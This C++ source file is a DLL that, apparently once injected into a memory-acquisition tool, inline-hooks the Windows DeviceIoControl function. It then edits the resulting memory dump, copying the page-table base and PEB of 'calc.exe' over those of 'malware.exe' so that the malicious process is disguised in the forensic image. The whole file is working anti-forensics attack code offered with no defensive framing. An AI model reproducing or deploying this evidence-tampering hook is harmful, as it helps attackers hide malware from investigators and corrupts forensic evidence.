// dllmain.cpp : Defines the entry point for the DLL application.
#define _CRT_SECURE_NO_WARNINGS
#include "windows.h"
#include "tchar.h"
#include "string.h"
#include <stdio.h>
#include <atlbase.h>
#include <TlHelp32.h>
DWORD PID = 0;
uintptr_t address = NULL;
class FileHandler
{
private:
	FILE *file;
public:
	FileHandler(const char *fileName, const char *flag) 
	{
		file = fopen(fileName, flag);
	}
	~FileHandler() 
	{
		fclose(file);
	}
	FILE* GetFilePtr() { return file; };
};

typedef DWORD64 *LPDWORD64;
HMODULE g_hMod = NULL;
HANDLE hFileDmp = 0;
HANDLE hFileJson = 0;
char NewSha256[64];

int HandleCounter = 0;

typedef BOOL(WINAPI *pfnDeviceIoControl)
(
	_In_        HANDLE       hDevice,
	_In_        DWORD        dwIoControlCode,
	_In_opt_    LPVOID       lpInBuffer,
	_In_        DWORD        nInBufferSize,
	_Out_opt_   LPVOID       lpOutBuffer,
	_In_        DWORD        nOutBufferSize,
	_Out_opt_   LPDWORD      lpBytesReturned,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
	);


BOOL WINAPI MyDeviceIoControl
(
	_In_        HANDLE       hDevice,
	_In_        DWORD        dwIoControlCode,
	_In_opt_    LPVOID       lpInBuffer,
	_In_        DWORD        nInBufferSize,
	_Out_opt_   LPVOID       lpOutBuffer,
	_In_        DWORD        nOutBufferSize,
	_Out_opt_   LPDWORD      lpBytesReturned,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
);


LPBYTE addr_pfnDeviceIoControl = NULL; //to get offset addr_pfnDeviceIoControl - pfnDeviceIoControl
LPBYTE ADDR_pfnDeviceIoControl[12] = { 0, };
BYTE DeviceIoControlBuf[12] = { 0, };

// e9 + (점프도착 - 점프시작-5)
////////////////////////////////             CreateFile                             //////////////////////////////////////////////
void DeviceIoControlHook()
{
	//07 fe
	BYTE DeviceIoControlBuf[12] = { 0, };
	DeviceIoControlBuf[0] = { 0x48 };
	DeviceIoControlBuf[1] = { 0xb8 };
	DeviceIoControlBuf[6] = { 0xfe };
	DeviceIoControlBuf[7] = { 0x07 };
	DeviceIoControlBuf[8] = { 0x0 };
	DeviceIoControlBuf[9] = { 0x0 };
	DeviceIoControlBuf[10] = { 0xff };
	DeviceIoControlBuf[11] = { 0xe0 };
	// Get Offset by calculate Address( e9 + JMP <destination> - JMP <start> - 5)
	*(LPDWORD)(DeviceIoControlBuf + 2) = (DWORD)((LPBYTE)MyDeviceIoControl);
	_tprintf(_T("\nInja1: %p \n inja2: %p\n"), (LPBYTE)MyDeviceIoControl, addr_pfnDeviceIoControl);
	_tprintf(_T("\DeviceIoControlBuf : %p \n"), DeviceIoControlBuf);
	//page ReadWrite authority change temporary
	DWORD OldProtect, OldProtect2;

	VirtualProtect(addr_pfnDeviceIoControl, 12, PAGE_READWRITE, &OldProtect);
	_tprintf(_T("GetLastError1 : %d \n"), GetLastError());
	//change Address which jump to myWriteFile
	memcpy(addr_pfnDeviceIoControl, DeviceIoControlBuf, 12);
	//change original authority 
	VirtualProtect(addr_pfnDeviceIoControl, 12, OldProtect, &OldProtect2);
	_tprintf(_T("GetLastError2 : %d \n"), GetLastError());

	return;
}

void DeviceIoControlUnHook()
{
	DWORD OldProtect, OldProtect2;
	VirtualProtect(addr_pfnDeviceIoControl, 12, PAGE_READWRITE, &OldProtect);
	memcpy(addr_pfnDeviceIoControl, DeviceIoControlBuf, 12);
	VirtualProtect(addr_pfnDeviceIoControl, 12, OldProtect, &OldProtect2);

	return;
}

// this function print variables for debuging
void myOutputDebugString(LPCTSTR pszStr, ...)
{
	TCHAR szMsg[256];
	va_list args;
	va_start(args, pszStr);
	_vstprintf_s(szMsg, 256, pszStr, args);
	OutputDebugString(szMsg);
}


BOOL WINAPI MyDeviceIoControl
(
	_In_        HANDLE       hDevice,
	_In_        DWORD        dwIoControlCode,
	_In_opt_    LPVOID       lpInBuffer,
	_In_        DWORD        nInBufferSize,
	_Out_opt_   LPVOID       lpOutBuffer,
	_In_        DWORD        nOutBufferSize,
	_Out_opt_   LPDWORD      lpBytesReturned,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
)
{
	DeviceIoControlUnHook();
	OutputDebugString(_T("(MyDeviceIoControl) : "));
	BOOL ret = DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped);
	DeviceIoControlHook();

	if (dwIoControlCode == 0x22C002) //Control code to move driver //second time It work!
	{

		LPCWSTR lpFileName = (LPWSTR)((char*)lpOutBuffer + 124); // .dmp file name
		OutputDebugString(_T("(Program Name) : "));
		OutputDebugStringW(lpFileName);

		HANDLE hFile = CreateFile(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if (hFile == INVALID_HANDLE_VALUE)
		{
			OutputDebugString(_T("Could not open File!\n"));
		}
		else
			OutputDebugString(_T("Success open File!\n"));

		HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL); // data on memory 


		if (hMapFile == NULL)
		{
			OutputDebugString(_T("\nCould not create map of file \n"));
		}
		DWORD fileHighSize = 0;
		DWORD fileLowSize = GetFileSize(hFile, &fileHighSize);

		_int64 fileSize = fileHighSize; //
		fileSize <<= 32;            // filesize Set 0x1[][][][] + 0xffff = 0x1ffff
		fileSize |= fileLowSize;      //

		PBYTE pbFile = (PBYTE)MapViewOfFile(hMapFile, (DWORD)FILE_MAP_ALL_ACCESS, 0, 0, 0); //
		int error = GetLastError();

		_tprintf(_T("GetLastError : %d \n"), error);
		if (pbFile == NULL)
		{
			OutputDebugString(_T("Could not map view of file \n"));
		}
		_tprintf(_T("\nBaseAddress: 0x%p\n"), address);
		_tprintf(_T("pbfile : %p, HighSize: %x, LowSize: %x \n"), &pbFile, fileHighSize, fileLowSize);



		//PBYTE Mystring[1024] = { 0, };
		//PBYTE Mystring2[1024] = { 0, };
		//memset(&Mystring, 'A', sizeof(Mystring));
		//memcpy(&(pbFile[0]), Mystring, sizeof(Mystring));

		PBYTE DTB[4] = { 0, };
		PBYTE PEB[8] = { 0, };
		PBYTE nullBuf[8] = { 0, };

		u_int procDTB = 0;
		__int64 procPEB = 0;
		const char * malwareName = "malware.exe";
		const char * calcName = "calc.exe";

		// Signature :	03 00 58 00 (00 || 01) XX XX XX
		//						XX XX XX XX XX XX FF FF
		// find DTB Logic
		for (_int64 i = 0; i <= fileSize - 16; i += 16) {
			if (pbFile[i] == 0x03 && pbFile[i + 1] == 0x00 && pbFile[i + 2] == 0x58 && pbFile[i + 3] == 0x00 &&
				(pbFile[i + 4] == 0x00 || pbFile[i + 4] == 0x01) && pbFile[i + 14] == 0xFF && pbFile[i + 15] == 0xFF) {
				// find specify process by name and is live or not
				// DTB 0x28(40)
				// _PEB 0x338(824)
				if (memcmp(&(pbFile[i + 736]), calcName, strlen(calcName)) == 0 && (pbFile[i-24] == 0x07)) {
					memcpy(&procDTB, &(pbFile[i + 40]), sizeof(procDTB));
					memcpy(&procPEB, &(pbFile[i + 824]), sizeof(procPEB));
				}
			}
		}

		for (_int64 i = 0; i <= fileSize - 16; i += 16) 
		{
			if (pbFile[i] == 0x03 && pbFile[i + 1] == 0x00 && pbFile[i + 2] == 0x58 && pbFile[i + 3] == 0x00 &&
				(pbFile[i + 4] == 0x00 || pbFile[i + 4] == 0x01) && pbFile[i + 14] == 0xFF && pbFile[i + 15] == 0xFF) 
				{
				// find specify DTB which process name is same
				if (memcmp(&(pbFile[i + 736]), malwareName, strlen(malwareName)) == 0 && (pbFile[i - 24] == 0x07)) 
				{
					memcpy(&(pbFile[i + 40]), &procDTB, sizeof(procDTB));
					memcpy(&(pbFile[i + 824]), &procPEB, sizeof(procPEB));
				}
			}
		}


		UnmapViewOfFile(pbFile);
		CloseHandle(hMapFile);
		CloseHandle(hFile);


	}

	return ret;
}
/*
uintptr_t GetModuleBaseAddress(DWORD procId, const wchar_t* modName)
{
uintptr_t modBaseAddr = 0;
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId);
printf("1. Get Last Error : %d\n", GetLastError());
if (hSnap != INVALID_HANDLE_VALUE)
{
printf("2. Get Last Error : %d\n", GetLastError());
MODULEENTRY32 modEntry;
modEntry.dwSize = sizeof(modEntry);
if (Module32First(hSnap, &modEntry))
{
do
{
printf("3. Get Last Error : %d\n", GetLastError());
if (!_wcsicmp(modEntry.szModule, modName))
{
modBaseAddr = (uintptr_t)modEntry.modBaseAddr;
printf("5. Get Last Error : %d\n", GetLastError());
break;
}
} while (Module32Next(hSnap, &modEntry));

}
}
CloseHandle(hSnap);
return modBaseAddr;
}
*/
DWORD FindProcessID(LPCTSTR szProcessName)
{
	DWORD dwPID = 0xFFFFFFFF;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;

	//GET the snapshot of the system
	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	//find process
	Process32First(hSnapShot, &pe);
	do
	{
		//printf("process Name: %S\n", pe.szExeFile);
		if (!lstrcmp(szProcessName, pe.szExeFile))
		{
			dwPID = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &pe));

	CloseHandle(hSnapShot);

	return dwPID;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	HANDLE hThread = NULL;

	g_hMod = (HMODULE)hinstDLL;
	SIZE_T nRread = 0;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		OutputDebugString(L"Injection Success!!!");
		//PID = FindProcessID(L"DumpIt.exe");

		//address = GetModuleBaseAddress(PID, L"DumpIt.exe");
		addr_pfnDeviceIoControl = (LPBYTE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "DeviceIoControl");
		_tprintf(_T("\DeviceIoControl Address : %p \n"), addr_pfnDeviceIoControl);
		memcpy(DeviceIoControlBuf, addr_pfnDeviceIoControl, 12);
		//_tprintf(_T("\addr_pfnDeviceIoContrl1 : %x%x%x%x%x%x \n"), addr_pfnDeviceIoControl[5], addr_pfnDeviceIoControl[4], addr_pfnDeviceIoControl[3], addr_pfnDeviceIoControl[2], addr_pfnDeviceIoControl[1]
		//, addr_pfnDeviceIoControl[0]);
		//_tprintf(_T("\DeviceIoControlBuf_2 : %x%x%x%x%x%x \n"), DeviceIoControlBuf[5], DeviceIoControlBuf[4], DeviceIoControlBuf[3], DeviceIoControlBuf[2], DeviceIoControlBuf[1]
		//, DeviceIoControlBuf[0]);
		DeviceIoControlHook();


		break;
	case DLL_PROCESS_DETACH:
		DeviceIoControlUnHook();
		break;
	}

	return TRUE;
}